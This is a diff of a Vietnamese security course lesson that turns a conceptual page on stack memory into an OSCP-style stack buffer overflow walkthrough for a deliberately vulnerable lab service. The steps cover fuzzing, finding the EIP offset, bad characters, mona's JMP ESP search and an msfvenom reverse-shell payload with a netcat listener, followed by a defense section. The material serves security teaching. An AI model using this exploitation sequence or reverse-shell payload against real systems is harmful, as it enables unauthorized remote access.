@@ -1,38 +1,35 @@
 ---
-title: "Chương trình dùng bộ nhớ như thế nào"
+title: "Tràn bộ đệm trên stack"
 code: "3.6"
 level: 3
-summary: "Stack là gì, vì sao dữ liệu dài quá chỗ lại nguy hiểm, và các lớp bảo vệ bộ nhớ hiện đại."
-duration: "75 phút"
+summary: "Cơ chế stack, và quy trình OSCP kinh điển để khai thác một chương trình lab cố tình để lỗi, từng bước."
+duration: "100 phút"
 objectives:
-  - "Hiểu stack và vai trò của địa chỉ trả về"
-  - "Giải thích vì sao ghi quá chỗ dành sẵn lại gây lỗi"
-  - "Hiểu ý nghĩa của tràn bộ đệm ở mức khái niệm"
-  - "Biết các lớp bảo vệ bộ nhớ hiện đại làm gì"
+  - "Hiểu stack, địa chỉ trả về, và vì sao ghi quá chỗ lại nguy hiểm"
+  - "Nắm quy trình 6 bước: fuzz, tìm offset, chiếm EIP, bad chars, JMP ESP, shellcode"
+  - "Biết các công cụ: pattern_create, msfvenom, debugger"
+  - "Hiểu các lớp bảo vệ bộ nhớ hiện đại và phòng thủ từ gốc"
 ---
 import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
 import ConceptMap from '../../components/sim/ConceptMap.tsx';
 import Quiz from '../../components/sim/Quiz.tsx';
 
 ## Hình dung trước
 
-Hãy tưởng tượng một chồng khay trong căng tin: khay mới đặt lên trên, lấy ra cũng từ trên xuống. Khi một hàm trong chương trình được gọi, máy tính đặt lên chồng này một khay chứa dữ liệu tạm của hàm, trong đó có cả một mẩu giấy ghi "chạy xong thì quay về đâu". Chồng khay đó gọi là *stack*.
+Hãy tưởng tượng một chồng khay trong căng tin: khay mới đặt lên trên, lấy ra cũng từ trên xuống. Khi một hàm được gọi, máy tính đặt lên chồng này một khay chứa dữ liệu tạm của hàm, trong đó có một mẩu giấy ghi "chạy xong thì quay về đâu". Chồng khay đó là *stack*.
+
+> Toàn bộ bài này mô tả quy trình trên một **chương trình lab cố tình để lỗi**, chạy trong máy ảo của bạn. Đây là bài thực hành kinh điển của OSCP, chỉ làm trong lab.
 
 ## Kiến thức chính
 
 ### Stack và địa chỉ trả về
 
-Mỗi khi một hàm chạy, nó được cấp một vùng nhớ trên stack để chứa biến cục bộ. Cùng vùng đó còn lưu **địa chỉ trả về**: nơi chương trình cần quay lại sau khi hàm kết thúc. Đây là chi tiết quan trọng nhất của bài.
+Mỗi hàm được cấp một vùng trên stack để chứa biến cục bộ. Cùng vùng đó lưu **địa chỉ trả về** (saved EIP trên hệ 32-bit): nơi chương trình quay lại sau khi hàm xong. Đây là chi tiết quan trọng nhất.
 
 ### Vì sao ghi quá chỗ lại nguy hiểm
 
-Giả sử một hàm dành 8 ô nhớ cho một cái tên. Nếu chương trình chép dữ liệu vào đó mà **không kiểm tra độ dài**, và dữ liệu dài hơn 8 ô, phần thừa sẽ tràn sang các ô bên cạnh. Trong đó có thể có cả ô chứa địa chỉ trả về.
-
-Nếu địa chỉ trả về bị ghi đè bằng dữ liệu linh tinh, khi hàm kết thúc chương trình sẽ nhảy tới một nơi vô nghĩa và sập. Đây là *tràn bộ đệm trên stack* (stack buffer overflow). Trong trường hợp bị lợi dụng có chủ đích, việc kiểm soát được địa chỉ trả về có thể dẫn tới việc chương trình chạy mã do kẻ tấn công chọn.
-
-Ở cấp này, mục tiêu là hiểu **cơ chế**: dữ liệu không được kiểm tra độ dài có thể ghi đè lên phần điều khiển luồng chạy của chương trình. Đây là nền để sau này học sâu hơn một cách có trách nhiệm trong lab.
-
-### Bố cục một khung stack (đơn giản hoá)
+Nếu một hàm dành 8 ô cho dữ liệu nhập mà chép vào đó **không kiểm tra độ dài**, dữ liệu dài hơn sẽ tràn sang các ô bên cạnh, trong đó có ô chứa địa chỉ trả về. Kiểm soát được địa chỉ trả về là **kiểm soát được chương trình sẽ chạy tiếp ở đâu**.
 
 <ConceptMap
   client:visible
@@ -40,10 +37,10 @@ Nếu địa chỉ trả về bị ghi đè bằng dữ liệu linh tinh, khi h�
   width={640}
   height={300}
   nodes={[
-    { id: 'buf', label: 'Vùng chứa tên', sub: '8 ô', x: 140, y: 90, detail: 'Chỗ dành cho dữ liệu người dùng nhập. Nếu chép vào đây mà không giới hạn độ dài, phần thừa sẽ tràn xuống dưới.' },
-    { id: 'saved', label: 'Dữ liệu lưu của hàm gọi', x: 140, y: 170, tone: 'warn', detail: 'Các giá trị cần khôi phục khi hàm kết thúc. Nằm ngay cạnh vùng chứa tên nên dễ bị tràn tới.' },
-    { id: 'ret', label: 'Địa chỉ trả về', x: 140, y: 250, tone: 'warn', detail: 'Nơi chương trình quay về sau khi hàm xong. Nếu bị ghi đè, luồng chạy của chương trình bị đổi hướng. Đây là mấu chốt của tràn bộ đệm.' },
-    { id: 'canary', label: 'Giá trị canh gác', sub: 'lớp bảo vệ', x: 440, y: 170, tone: 'accent', detail: 'Stack canary: một giá trị bí mật đặt ngay trước địa chỉ trả về. Trước khi hàm kết thúc, chương trình kiểm tra nó có bị đổi không; nếu có thì dừng ngay. Một trong các lớp bảo vệ hiện đại.' },
+    { id: 'buf', label: 'Vùng chứa dữ liệu nhập', sub: '8 ô', x: 160, y: 85, detail: 'Chỗ cho dữ liệu người dùng. Chép vào không giới hạn độ dài thì phần thừa tràn xuống dưới.' },
+    { id: 'saved', label: 'Dữ liệu lưu của hàm gọi', x: 160, y: 165, tone: 'warn', detail: 'Nằm ngay cạnh vùng nhập nên dễ bị tràn tới.' },
+    { id: 'ret', label: 'Địa chỉ trả về (EIP)', x: 160, y: 245, tone: 'bad', detail: 'Nơi chương trình quay về. Ghi đè được nó = đổi hướng luồng chạy. Mấu chốt của tràn bộ đệm.' },
+    { id: 'canary', label: 'Stack canary', sub: 'lớp bảo vệ', x: 460, y: 165, tone: 'accent', detail: 'Giá trị bí mật đặt trước địa chỉ trả về; kiểm tra trước khi hàm kết thúc. Bị đổi thì dừng ngay.' },
   ]}
   edges={[
     { from: 'buf', to: 'saved', label: 'tràn xuống' },
@@ -52,39 +49,98 @@ Nếu địa chỉ trả về bị ghi đè bằng dữ liệu linh tinh, khi h�
   ]}
 />
 
-### Các lớp bảo vệ bộ nhớ hiện đại
+## Thực hành: quy trình OSCP 6 bước
 
-Hệ điều hành và trình biên dịch ngày nay có nhiều lớp phòng thủ, giải thích vì sao khai thác loại này khó hơn xưa nhiều:
+Mục tiêu: một dịch vụ lab nghe trên một cổng và nhận chuỗi nhập chưa kiểm tra độ dài. Ta làm trong máy ảo Windows với một debugger (Immunity/x32dbg).
 
-- **Stack canary:** giá trị canh gác như mô tả ở trên, phát hiện việc ghi đè.
-- **DEP/NX:** đánh dấu vùng dữ liệu là "không được chạy như mã", nên dữ liệu tràn vào không chạy được trực tiếp.
-- **ASLR:** xáo trộn ngẫu nhiên vị trí các vùng nhớ mỗi lần chạy, khiến kẻ tấn công khó đoán địa chỉ.
+**Bước 1 — Fuzz: gửi chuỗi dài dần tới khi chương trình sập.**
+
+<Terminal title="Gửi A nhiều dần để tìm điểm sập">
+kali@lab:~$ # gửi 100, 200, 300... ký tự 'A'
+kali@lab:~$ python3 -c "print('A'*700)" | nc 10.10.14.70 9999
+# Debugger trên máy đích báo chương trình sập khi tới khoảng 600-700 byte
+</Terminal>
+
+**Bước 2 — Tìm offset: chính xác byte thứ bao nhiêu ghi đè EIP.**
+
+<Terminal title="pattern_create và pattern_offset">
+kali@lab:~$ msf-pattern_create -l 700
+Aa0Aa1Aa2Aa3Aa4Ab0Ab1...
+# Gửi chuỗi này; debugger cho thấy EIP = 39694438
+
+kali@lab:~$ msf-pattern_offset -l 700 -q 39694438
+[*] Exact match at offset 628
+</Terminal>
+
+Vậy 628 byte đầu lấp đầy vùng đệm; 4 byte tiếp theo rơi đúng vào EIP.
+
+**Bước 3 — Chiếm EIP: xác nhận kiểm soát được.**
+
+<Terminal title="628 byte đệm + 4 byte BBBB vào EIP">
+payload = b"A"*628 + b"BBBB" + b"C"*100
+# Debugger hiện EIP = 42424242 (mã hex của 'BBBB'). Ta kiểm soát EIP.
+</Terminal>
+
+**Bước 4 — Tìm bad chars: byte nào làm hỏng payload.**
+
+Gửi gần như đủ 256 giá trị byte, so sánh trong bộ nhớ xem byte nào bị biến dạng hoặc cắt chuỗi. `\x00` (null) gần như luôn xấu; có thể thêm `\x0a`, `\x0d`. Danh sách bad char này dùng ở bước sau.
+
+**Bước 5 — Tìm JMP ESP: một địa chỉ ổn định để nhảy vào shellcode.**
+
+<Terminal title="Tìm lệnh JMP ESP không chứa bad char">
+# Trong Immunity, dùng mona:
+!mona jmp -r esp -cpb "\x00\x0a\x0d"
+# Kết quả: 0x625011af  (một địa chỉ JMP ESP trong module không bảo vệ)
+</Terminal>
+
+Ghi đè EIP bằng địa chỉ này (viết ngược do little-endian: `\xaf\x11\x50\x62`). Khi hàm trả về, CPU "nhảy tới ESP" — nơi ta sắp đặt shellcode.
+
+**Bước 6 — Shellcode: tạo bằng msfvenom, loại bad char.**
+
+<Terminal title="msfvenom sinh shellcode tránh bad char">
+kali@lab:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 \
+  -b "\x00\x0a\x0d" -f python
+buf =  b"\xbf\x...\x..."   # shellcode đã mã hoá, không chứa bad char
+</Terminal>
+
+Payload cuối: `"A"*628 + <địa chỉ JMP ESP> + nop_sled + shellcode`. Gửi đi, bắt kết nối bằng `nc -lvnp 443`, và có shell. Đây là toàn bộ cung đường tràn bộ đệm trên stack theo đúng cách OSCP dạy.
+
+### Các lớp bảo vệ hiện đại
+
+Khai thác loại này khó hơn xưa nhiều vì nhiều lớp phòng thủ:
+
+- **Stack canary:** giá trị canh gác phát hiện ghi đè.
+- **DEP/NX:** đánh dấu vùng dữ liệu "không được chạy như mã", nên shellcode tràn vào không chạy trực tiếp (phải dùng kỹ thuật phức tạp hơn).
+- **ASLR:** xáo trộn ngẫu nhiên vị trí các vùng nhớ mỗi lần chạy, khiến khó đoán địa chỉ như JMP ESP.
+
+Bài lab OSCP thường tắt bớt các lớp này để dạy nền tảng; hệ thống thật bật đầy đủ.
 
 ## Góc phòng thủ
 
 <Callout type="defense">
-Gốc rễ của lỗi nằm ở việc chép dữ liệu mà không kiểm tra độ dài. Phòng thủ từ gốc: dùng các hàm có giới hạn độ dài, kiểm tra kích thước đầu vào, và dùng ngôn ngữ lập trình tự quản lý bộ nhớ khi có thể. Về phía hệ thống: bật đầy đủ canary, DEP/NX, ASLR, và cập nhật phần mềm. Nhiều lớp cùng lúc khiến một lỗi đơn lẻ khó trở thành khai thác hoàn chỉnh.
+Gốc rễ là chép dữ liệu mà không kiểm tra độ dài. Phòng thủ từ gốc: dùng hàm có giới hạn độ dài, kiểm tra kích thước đầu vào, và dùng ngôn ngữ tự quản lý bộ nhớ (Rust, Go, Java...) khi có thể. Về hệ thống: bật đầy đủ canary, DEP/NX, ASLR, và cập nhật phần mềm. Nhiều lớp cùng lúc khiến một lỗi đơn lẻ khó thành khai thác hoàn chỉnh.
 </Callout>
 
 ## Lỗi người mới hay gặp
 
-- Nghĩ tràn bộ đệm chỉ làm chương trình sập. Sập chỉ là biểu hiện dễ thấy nhất; vấn đề an ninh nằm ở khả năng đổi hướng luồng chạy.
-- Bỏ qua các lớp bảo vệ khi học, rồi ngạc nhiên vì kỹ thuật cũ không còn hiệu quả.
-- Lẫn lộn stack với các vùng nhớ khác. Bài này chỉ nói về stack, vùng nhớ dễ hình dung nhất.
+- Nghĩ tràn bộ đệm chỉ làm sập chương trình. Sập chỉ là biểu hiện; vấn đề an ninh là đổi hướng luồng chạy.
+- Quên loại bad char khỏi shellcode, rồi payload chạy nửa chừng thì hỏng.
+- Viết địa chỉ theo thứ tự xuôi thay vì ngược (little-endian).
 
 ## Kiểm tra nhanh
 
 <Quiz
   client:visible
   questions={[
-    { q: 'Vì sao địa chỉ trả về trên stack lại quan trọng với an ninh?', options: ['Vì nó lưu mật khẩu', 'Vì ghi đè lên nó có thể đổi hướng luồng chạy của chương trình', 'Vì nó làm chương trình nhanh hơn'], answer: 1, explain: 'Địa chỉ trả về quyết định chương trình chạy tiếp ở đâu; kiểm soát được nó là kiểm soát luồng chạy.' },
-    { q: 'Nguyên nhân gốc của tràn bộ đệm trên stack là gì?', options: ['Mạng chậm', 'Chép dữ liệu vào vùng nhớ mà không kiểm tra độ dài', 'Mật khẩu yếu'], answer: 1, explain: 'Khi không giới hạn độ dài, dữ liệu thừa tràn sang các ô lân cận.' },
-    { q: 'ASLR bảo vệ bằng cách nào?', options: ['Mã hoá dữ liệu', 'Xáo trộn ngẫu nhiên vị trí các vùng nhớ mỗi lần chạy', 'Chặn mạng'], answer: 1, explain: 'ASLR làm địa chỉ thay đổi mỗi lần chạy nên khó đoán.' },
+    { q: 'Vì sao địa chỉ trả về (EIP) quan trọng với an ninh?', options: ['Nó lưu mật khẩu', 'Ghi đè nó cho phép đổi hướng luồng chạy của chương trình', 'Nó làm chương trình nhanh hơn'], answer: 1, explain: 'EIP quyết định chương trình chạy tiếp ở đâu; kiểm soát nó là kiểm soát luồng chạy.' },
+    { q: 'pattern_create / pattern_offset dùng để làm gì?', options: ['Sinh shellcode', 'Tìm chính xác byte thứ bao nhiêu ghi đè EIP', 'Quét cổng'], answer: 1, explain: 'Chuỗi mẫu không lặp giúp tính offset chính xác từ giá trị EIP lúc sập.' },
+    { q: 'Vì sao cần tìm địa chỉ JMP ESP?', options: ['Để làm sập nhanh hơn', 'Để sau khi trả về, CPU nhảy tới ESP nơi đặt shellcode', 'Để mã hoá dữ liệu'], answer: 1, explain: 'Ghi đè EIP bằng địa chỉ JMP ESP khiến luồng chạy nhảy vào shellcode ta đặt sẵn ở ESP.' },
+    { q: 'ASLR bảo vệ bằng cách nào?', options: ['Mã hoá dữ liệu', 'Xáo trộn ngẫu nhiên vị trí vùng nhớ mỗi lần chạy', 'Chặn mạng'], answer: 1, explain: 'ASLR làm địa chỉ thay đổi mỗi lần chạy nên khó đoán.' },
   ]}
 />
 
 ## Ghi nhớ
 
-- Stack lưu biến cục bộ và địa chỉ trả về của mỗi hàm.
-- Chép dữ liệu không kiểm tra độ dài có thể ghi đè địa chỉ trả về và đổi hướng luồng chạy.
-- Canary, DEP/NX và ASLR là các lớp bảo vệ hiện đại; phòng thủ từ gốc là kiểm tra độ dài đầu vào.
+- Stack lưu biến cục bộ và địa chỉ trả về (EIP) của mỗi hàm.
+- Quy trình: fuzz → offset → chiếm EIP → bad chars → JMP ESP → shellcode (msfvenom).
+- Canary/DEP/ASLR là lớp bảo vệ hiện đại; phòng thủ gốc là kiểm tra độ dài đầu vào.
